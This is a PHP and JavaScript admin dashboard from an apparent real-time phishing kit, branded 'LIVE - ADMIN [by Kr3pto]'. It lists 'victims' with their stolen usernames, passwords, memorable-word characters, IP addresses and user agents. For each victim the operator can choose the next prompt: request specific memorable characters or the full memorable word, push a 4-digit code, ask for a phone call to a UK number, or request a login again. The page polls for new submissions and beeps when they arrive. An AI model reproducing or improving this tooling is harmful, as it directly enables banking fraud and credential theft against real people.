<?php


include '../files/config.php';
include '../files/connect.php';
session_start();



if($_SESSION['admin_logged'] == 'true'){
	
}else{
	header('location:./');
}
?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors">
    <meta name="generator" content="Jekyll v3.8.6">
    <title>LIVE - ADMIN</title>

    

<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">


<meta name="theme-color" content="#563d7c">


    <style>
      .bd-placeholder-img {
        font-size: 1.125rem;
        text-anchor: middle;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
      }

      @media (min-width: 768px) {
        .bd-placeholder-img-lg {
          font-size: 3.5rem;
        }
      }
    </style>
    <link href="files/css/dashboard.css" rel="stylesheet">
	<link rel="icon" href="../files/img/favicon.ico" type="image/ico">
	<script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
<script>
function beep() {
	var sound = new Audio("../files/beep.wav");
    sound.play();
}
function showfields(userid) {

	
	
	
	
	if ($("#askcharsradio"+userid).is(':checked')) {
		$('#askchars'+userid).show();
		
		$('#askcallcode'+userid).hide();
		$('#askcallcode'+userid).find('input').val('');
		$('#askcall'+userid).hide();
		$('#askcall'+userid).find('input').val('');
		
	}else{
		$('#askchars'+userid).hide();
		$('#askchars'+userid).find('input').val('');
	}
	
	
	
	
	if ($("#askcallcoderadio"+userid).is(':checked')) {
		$('#askcallcode'+userid).show();
		
		$('#askchars'+userid).hide();
		$('#askchars'+userid).find('input').val('');
		$('#askcall'+userid).hide();
		$('#askcall'+userid).find('input').val('');
		
	}else{
		$('#askcallcode'+userid).hide();
		$('#askcallcode'+userid).find('input').val('');
	}
	
	
	//askcall
	
	
	
	if ($("#askcallradio"+userid).is(':checked')) {
		$('#askcall'+userid).show();
		
		$('#askcallcode'+userid).hide();
		$('#askcallcode'+userid).find('input').val('');
		$('#askchars'+userid).hide();
		$('#askchars'+userid).find('input').val('');
		
		
	}else{
		$('#askcall'+userid).hide();
	}
	
	if ($("#askloginradio"+userid).is(':checked')) {
		
		$('#askcallcode'+userid).hide();
		$('#askcallcode'+userid).find('input').val('');
		$('#askchars'+userid).hide();
		$('#askchars'+userid).find('input').val('');
		$('#askcall'+userid).hide();
		$('#askcall'+userid).find('input').val('');
		
	}else{
		//nothinh
	}
	
	if ($("#finishradio"+userid).is(':checked')) {
		$('#askcallcode'+userid).hide();
		$('#askcallcode'+userid).find('input').val('');
		$('#askchars'+userid).hide();
		$('#askchars'+userid).find('input').val('');
		$('#askcall'+userid).hide();
		$('#askcall'+userid).find('input').val('');
	}else{
		//nothinh
	}
	
	

}

var timmer = setInterval(function() {
	var urldata = '../files/action.php?get_submitted';
	$.ajax({
		url:urldata,
		type:'GET',
		success: function(response){
			//console.log(response)
			var rasponse = JSON.parse(response)
			if(rasponse.status == 'ok'){
				beep();
			Toast.fire({
				icon: 'info',
				title: 'Some Info Submitted Please Refresh'
				})
	//clearInterval(timmer);
			}
			
		},
		error: function(err) {
			console.error('error: ' + err);
		}
	
	});
	
}, 6500);





</script>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@9"></script>
<script>
const Toast = Swal.mixin({
  toast: true,
  position: 'top-end',
  showConfirmButton: false,
  timer: 3000,
  timerProgressBar: true,
  onOpen: (toast) => {
    toast.addEventListener('mouseenter', Swal.stopTimer)
    toast.addEventListener('mouseleave', Swal.resumeTimer)
  }
})












</script>

  </head>
  <body>
<script>
Toast.fire({
  icon: 'success',
  title: 'Signed in successfully'
})

function buzzoff(){
	$.ajax({
		url:'../files/action.php?buzzoff',
		type:'GET',
		success: function(response){
			//console.log(response);
			var rasponse = JSON.parse(response);
			if(rasponse.status == 'ok'){
			Swal.fire({
				icon: 'success',
				title: 'BUZZ OFF',
				showConfirmButton: false,
				timerProgressBar: true,
				timer: 1500
			})
			setTimeout(function () {
					window.location.reload();
			}, 2000);
	//clearInterval(timmer);
			}
			
		},
		error: function(err) {
			console.error('error: ' + err);
		}
	
	});
}

function deleteentry(elem){
	var fullid = $(elem).attr('id');
	var userid = fullid.replace('userid_','');
	$.ajax({
		type : 'POST',
		url : '../files/action.php?type=delete',
		data : 'userid='+ userid,
		success: function (data) {
			//console.log(data);
			var parsed_data = JSON.parse(data);
			if(parsed_data.status == 'ok'){
				Toast.fire({
					icon: 'success',
					title: 'Entry Deleted'
				})
				setTimeout(function () {
					window.location.reload();
				}, 2000);
				
			}else{
				Toast.fire({
					icon: 'error',
					title: 'An error has occured'
				})
				return false;
			}
			//console.log(parsed_data.status);
		}
		});
}





</script>
<nav class="navbar navbar-dark fixed-top bg-dark flex-md-nowrap p-0 shadow">
  <a class="navbar-brand col-sm-3 col-md-12 mr-0" href="#">LIVE - ADMIN<sub><small> [by Kr3pto]</small></sub></a>
</nav>

<div class="container-fluid">
  <div class="row">

    <main role="main" class="col-md-12   ">
      <div class="d-flex justify-content-between flex-wrap flex-md-nowrap align-items-center pt-3 pb-2 mb-3 border-bottom">
        <h1 class="h2">Dashboard</h1>
        <div class="btn-toolbar mb-2 mb-md-0">
          <div class="btn-group mr-2">
            <button type="button" class="btn btn-sm btn-info" onclick="buzzoff();">BuZZ Off</button>
            <button type="button" class="btn btn-sm btn-success" onclick="window.location.reload();">Refresh</button>
            <button type="button" class="btn btn-sm btn-danger" onclick="window.location.href = 'logout.php';">Signout</button>
          </div>
        </div>
      </div>

      

      <h2>Victims List</h2>
      <div class="table-responsive">
        <table class="table table-striped table-sm">
          <thead>
            <tr>
              <th>#</th>
              <th>User</th>
              <th>IP</th>
              <th>Status</th>
              <th>Action</th>
            </tr>
          </thead>
          <tbody id="logintable">
	  
          </tbody>
        </table>
      </div>
    </main>
  </div>
</div>

<script>

function form_submit(elem) {
    var id = $(elem).attr("id");
    var parentformid = $('#'+id).closest('form').attr('id');
	var serialized_form = $('#'+parentformid).serialize();
	$.ajax({
		type : 'POST',
		url : '../files/action.php?type=commmand',
		data : serialized_form,
		success: function (data) {
			//console.log(data);
			var parsed_data = JSON.parse(data);
			if(parsed_data.status == 'ok'){
				Swal.fire({
					icon: 'success',
					title: 'Setting Saved Please Refresh',
					showConfirmButton: false,
					timerProgressBar: true,
					timer: 1500
				})	
				setTimeout(function () {
					window.location.reload();
				}, 2000);
				
			}else{
				Toast.fire({
					icon: 'error',
					title: 'An error has occured'
				})
				return false;
			}
			//console.log(parsed_data.status);
		}
		})
		
}





function decision_submit(elem) {
    var id = $(elem).attr("id");
	

	
    var parentformid = $('#'+id).closest('form').attr('id');
	
	var serialized_form = $('#'+parentformid).serialize();
	serialized_form = serialized_form + "&status=" + id
	//console.log(serialized_form)
	$.ajax({
		type : 'POST',
		url : '../files/action.php?type=submitted',
		data : serialized_form,
		success: function (data) {
			//console.log(data);
			var parsed_data = JSON.parse(data);
			if(parsed_data.status == 'ok'){
				Swal.fire({
				icon: 'success',
				title: 'Setting Saved Please Refresh',
				showConfirmButton: false,
				timerProgressBar: true,
				timer: 1500
				})
				setTimeout(function () {
					window.location.reload();
				}, 2000);
				
			}else{
				Swal.fire({
				icon: 'error',
				title: 'An error has occured',
				showConfirmButton: false,
				timerProgressBar: true,
				timer: 1500
				})
				return false;
			}
			//console.log(parsed_data.status);
		}
		})
		

}


</script>
<?php



$query = mysqli_query($conn, "SELECT * from customers");
if($query){
	if(mysqli_num_rows($query) >= 1){
		$array = mysqli_fetch_all($query,MYSQLI_ASSOC);
		//print_r($array);
	}
}

foreach($array as $value){




$user = $value['user'];
$pass = $value['pass'];


$askchar1  = $value['askchar1'];
$askchar2  = $value['askchar2'];
$askchar3  = $value['askchar3'];


$char1  = $value['char1'];
$char2  = $value['char2'];
$char3  = $value['char3'];

$fullMem = $value['fullMem'];



$ip = $value['ip'];
$useragent = urldecode($value['useragent']);




$previous_info = "
+-----------------------------+
Username : $user
Password : $pass
$askchar1 : $char1
$askchar2 : $char2
$askchar3 : $char3
Full Mem : $fullMem
IP : $ip
UA : $useragent
+-----------------------------+";

echo "

<div class='modal fade' id='modal_userid_{$value['id']}' tabindex='-1' role='dialog' aria-labelledby='exampleModalLabel' aria-hidden='true'>

	<form name='config_form_{$value['id']}' id='config_form_{$value['id']}' method='POST' action='' novalidate>
	<input type='hidden' name='userid' value='{$value['id']}'>
  <div class='modal-dialog' role='document'>
    <div class='modal-content'>
      <div class='modal-header'>
        <h5 class='modal-title' id='exampleModalLabel'>Choose Action</h5>
        <button type='button' class='close' data-dismiss='modal' aria-label='Close'>
          <span aria-hidden='true'>&times;</span>
        </button>
      </div>
      <div class='modal-body'>
	  
	  <div class='form-group'>
			<br>
			<textarea id='textareaoptions' class='form-control' disabled='disabled' rows='16'>PREVIOUS INFO : $previous_info</textarea>
		</div>
	  
		<div class='form-check'>
			<input type='radio' name='status' value='2' id='askcharsradio{$value['id']}' onclick='showfields({$value['id']});' class='status form-check-input'>
			<label for='askloginotpradio{$value['id']}' class='form-check-label'>ASK Memorable Chars</label>
		</div>
		
		<div class='form-group' style='display:none;' id='askchars{$value['id']}'>
			<br>
			<div class='row'>
				<div class='col'>
					<input type='text' class='form-control' name='1stchar' id='1stchar' placeholder='ex: 1st'>
				</div>
				<div class='col'>
					<input type='text' class='form-control' name='2ndchar' id='2ndchar' placeholder='ex: 1st'>
				</div>
				<div class='col'>
					<input type='text' class='form-control' name='3rdchar' id='3rdchar' placeholder='ex: 1st'>
				</div>
			</div>
		</div>

		<div class='form-check'>
			<input type='radio' name='status' checked value='150' id='askloginradio{$value['id']}' onclick='showfields({$value['id']});' class='status form-check-input'>
			<label for='askloginradio{$value['id']}' class='form-check-label'>ASK Full Memorable</label>
		</div>
		
		<div class='form-check'>
			<input type='radio' name='status' checked value='7' id='askcallcoderadio{$value['id']}' onclick='showfields({$value['id']});' class='status form-check-input'>
			<label for='askccradio{$value['id']}' class='form-check-label'>Give Code</label>
		</div>
		<div class='form-group' style='display:none;' id='askcallcode{$value['id']}'>
			<br>
			<input type='text' class='form-control' name='callcode' id='callcode' placeholder='4-Digit Code'><br>
		</div>
		
		<div class='form-check'>
			<input type='radio' name='status' checked value='8' id='askcallradio{$value['id']}' onclick='showfields({$value['id']});' class='status form-check-input'>
			<label for='askccradio{$value['id']}' class='form-check-label'>ASK Call</label>
		</div>
		<div class='form-group' style='display:none;' id='askcall{$value['id']}'>
			<br>
			<input type='text' class='form-control' name='callnum' id='callnum' placeholder='Phone Number in the +44 7****** FORMAT'><br>
		</div>
		


		
		<div class='form-check'>
			<input type='radio' name='status' checked value='5' id='askloginradio{$value['id']}' onclick='showfields({$value['id']});' class='status form-check-input'>
			<label for='askloginradio{$value['id']}' class='form-check-label'>ASK LOGIN AGAIN</label>
		</div>
		<div class='form-check'>
			<input type='radio' name='status' value='4' id='finishradio{$value['id']}' onclick='showfields({$value['id']});' class='status form-check-input'>
			<label for='finishradio{$value['id']}' class='form-check-label' style='color:red;'>Finish</label>
		</div>

      </div>
      <div class='modal-footer'>
        <button type='button' class='btn btn-secondary' data-dismiss='modal'>Close</button>
        <!--<button role='button' type='submit' class='btn btn-primary'>Save</button>-->
        <!--<button id='save_{$value['id']}' onclick='form_submit()' type='button' class='btn btn-primary'>Save</button>-->
        <button id='save_{$value['id']}' onclick='form_submit(this)' type='button' class='btn btn-primary'>Save</button>
      </div>
    </div>
  </div>
  </form>
</div>





<div class='modal fade' id='submitmodal_userid_{$value['id']}' tabindex='-1' role='dialog' aria-labelledby='exampleModalLabel' aria-hidden='true'>

	<form name='submitconfig_form_{$value['id']}' id='submitconfig_form_{$value['id']}' method='POST' action='' novalidate>
	<input type='hidden' name='userid' value='{$value['id']}'>
  <div class='modal-dialog' role='document'>
    <div class='modal-content'>
      <div class='modal-header'>
        <h5 class='modal-title' id='exampleModalLabel'>Choose Action</h5>
        <button type='button' class='close' data-dismiss='modal' aria-label='Close'>
          <span aria-hidden='true'>&times;</span>
        </button>
      </div>
      <div class='modal-body'>
	  
	  <div class='form-group'>
			<br>
			<textarea id='textareadecisions' class='form-control' disabled='disabled' rows='12'>Submitted INFO : $previous_info</textarea>
		</div>
	 
		
		
      </div>
      <div class='modal-footer'>
	   <button type='button' id='accept_{$value['id']}' class='btn btn-lg btn-success' name='decision' data-dismiss='modal' onclick='decision_submit(this)'>Accept</button>
	  <button type='button' id='reject_{$value['id']}' class='btn btn-lg btn-danger' name='decision' data-dismiss='modal' onclick='decision_submit(this)'>Reject</button>
        
      </div>
    </div>
  </div>
  </form>
</div>


<div class='modal fade' id='viewmodal_userid_{$value['id']}' tabindex='-1' role='dialog' aria-labelledby='exampleModalLabel' aria-hidden='true'>

	<form name='config_form_{$value['id']}' id='config_form_{$value['id']}' method='POST' action='' novalidate>
	<input type='hidden' name='userid' value='{$value['id']}'>
  <div class='modal-dialog' role='document'>
    <div class='modal-content'>
      <div class='modal-header'>
        <h5 class='modal-title' id='exampleModalLabel'>Victim Info</h5>
        <button type='button' class='close' data-dismiss='modal' aria-label='Close'>
          <span aria-hidden='true'>&times;</span>
        </button>
      </div>
      <div class='modal-body'>
	  
	  <div class='form-group'>
			<br>
			<textarea id='textareafinish' class='form-control' disabled='disabled' rows='12'>Victim INFO : $previous_info</textarea>
		</div>
	 
		
		
      </div>
      <div class='modal-footer'>
	  <button type='button' class='btn btn-lg btn-dark col-12' data-dismiss='modal'>CLOSE</button>
        
      </div>
    </div>
  </div>
  </form>
</div>





";
}

?>








	<script type="text/javascript">
		$(document).ready(function() {
			setInterval(function () {
				$('#logintable').load('table.php')
			}, 1000);
		});
    </script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"></script>
	</body>
</html>
